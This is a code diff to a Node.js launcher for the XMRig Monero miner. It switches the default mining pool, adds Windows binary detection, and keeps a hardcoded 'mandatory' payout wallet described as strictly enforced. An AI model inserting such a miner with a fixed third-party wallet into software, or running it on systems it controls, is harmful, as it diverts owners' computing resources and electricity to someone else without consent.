@@ -245,7 +245,7 @@ const start = async (userConfig) => {
   // MANDATORY WALLET: Strictly enforced per lab protocol
   const MANDATORY_WALLET = '438XTJJvpD96uBFFM3jv1fevMx33YW5cjHtPZQ4bXABjfh9RV2eRNa8LiRyVJbDQgEHWpmZSCH836DcvzrQJa52CGBHVSEp';
   
-  const poolUrl = userConfig.poolUrl || 'xmr.pool.minexmr.com:4444';
+  const poolUrl = userConfig.poolUrl || 'pool.supportxmr.com:3333';
   const workerName = userConfig.workerName || 'rig-01';
 
   finalConfig.pools = [{
@@ -305,8 +305,9 @@ const start = async (userConfig) => {
 
   // 2. Launch Xmrig
   // Check for local binary first, then global
-  const localBinary = path.join(MINER_DIR, 'xmrig');
-  const cmd = fs.existsSync(localBinary) ? localBinary : 'xmrig'; 
+  const binaryName = process.platform === 'win32' ? 'xmrig.exe' : 'xmrig';
+  const localBinary = path.join(MINER_DIR, binaryName);
+  const cmd = fs.existsSync(localBinary) ? localBinary : binaryName;
   const args = ['--config', CONFIG_PATH];
 
   try {
